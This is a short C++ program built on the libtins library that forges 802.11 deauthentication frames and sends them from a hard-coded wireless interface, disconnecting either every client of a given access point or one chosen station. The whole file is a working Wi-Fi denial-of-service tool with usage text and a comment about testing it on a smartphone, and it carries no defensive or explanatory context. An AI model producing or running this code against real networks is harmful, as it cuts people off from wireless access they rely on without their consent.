#include <iostream>
#include <unistd.h>
#include <tins/tins.h>

using namespace Tins;
using namespace std;

int main(int argc, char** argv) {

        if(argc<2){
            printf("usage:\n  deauth <options> dst_mac_ap [src_mac_station] \n");
            return 0;
        }

        Dot11Deauthentication deauth;

        if(argc==2){
        deauth.addr1("FF:FF:FF:FF:FF:FF"); // why don't notebook? anyway, check smartphone! done well!!
        deauth.addr2((Dot11::address_type)argv[1]); // STATION
        deauth.addr3((Dot11::address_type)argv[1]); // BSSID
        }

        if(argc==3){
        deauth.addr1((Dot11::address_type)argv[1]);
        deauth.addr2((Dot11::address_type)argv[2]);
        deauth.addr3((Dot11::address_type)argv[1]);
        }

        //deauth.reason_code(3);
        //RadioTap radio = RadioTap();
        //radio.inner_pdu(deauth);

        RadioTap radio = RadioTap() / deauth;

        PacketSender sender;
        sender.send(radio, "wlx909f33e950c4");

}
